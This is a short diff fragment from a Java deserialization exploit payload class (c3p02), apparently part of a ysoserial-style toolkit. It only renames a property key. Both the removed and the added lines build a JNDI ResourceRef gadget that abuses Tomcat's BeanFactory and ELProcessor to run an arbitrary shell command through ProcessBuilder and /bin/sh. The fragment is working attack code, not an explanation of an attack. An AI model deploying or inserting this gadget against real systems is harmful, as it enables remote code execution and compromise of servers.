@@ -43,8 +43,8 @@ public class c3p02 implements ObjectPayload<Object>{
 
         public Reference getReference() throws NamingException {
             ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-            ref.add(new StringRefAddr("forceString", "nu1r=eval"));
-            ref.add(new StringRefAddr("nu1r", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + cmd + "']).start()\")"));
+            ref.add(new StringRefAddr("forceString", "QI4L=eval"));
+            ref.add(new StringRefAddr("QI4L", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + cmd + "']).start()\")"));
             return ref;
         }
 
